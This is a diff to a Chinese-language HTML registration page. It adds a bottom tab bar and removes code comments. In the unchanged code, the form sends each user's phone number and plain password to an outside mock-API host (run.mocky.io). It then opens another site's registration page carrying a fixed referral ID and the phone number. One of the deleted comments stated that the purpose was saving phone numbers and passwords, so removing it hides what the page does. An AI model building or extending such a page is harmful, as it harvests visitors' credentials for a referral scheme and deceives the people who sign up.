@@ -14,7 +14,7 @@
     }
     .container {
       max-width: 500px;
-      margin: 50px auto;
+      margin: 80px auto 100px auto;
       background: white;
       padding: 30px;
       border-radius: 16px;
@@ -67,6 +67,25 @@
       font-size: 14px;
       margin-top: 20px;
     }
+    .tabbar {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background-color: #fff;
+      display: flex;
+      justify-content: space-around;
+      border-top: 1px solid #ddd;
+      padding: 10px 0;
+    }
+    .tabbar a {
+      text-decoration: none;
+      color: #666;
+      font-size: 14px;
+    }
+    .tabbar a.active {
+      color: #24c29a;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
@@ -99,6 +118,12 @@
     </div>
   </div>
 
+  <div class="tabbar">
+    <a href="#" class="active">首页</a>
+    <a href="#" onclick="alert('会员权益页面建设中')">会员权益</a>
+    <a href="#" onclick="alert('我的页面建设中')">我的</a>
+  </div>
+
   <script>
     document.getElementById("myForm").addEventListener("submit", function(e) {
       e.preventDefault();
@@ -110,7 +135,6 @@
         return;
       }
 
-      // 同步注册到你后台（保存手机号密码）
       fetch("https://run.mocky.io/v3/55fd0664-4b79-41eb-9f7d-27cd3182eb13", {
         method: "POST",
         headers: {
@@ -119,9 +143,7 @@
         body: JSON.stringify({ phone, password })
       }).then(() => {
         alert("注册成功，请在新页面完成验证码验证");
-        // 跳转倍莱鲜注册页（用户验证短信验证码）
         window.open(`http://blx.longliqi.com/register.html?referee_id=1749824&mobile=${encodeURIComponent(phone)}`, '_blank');
-        // 显示礼包跳转按钮
         document.getElementById("giftSection").style.display = 'block';
       }).catch(() => {
         alert("注册失败，请稍后再试");
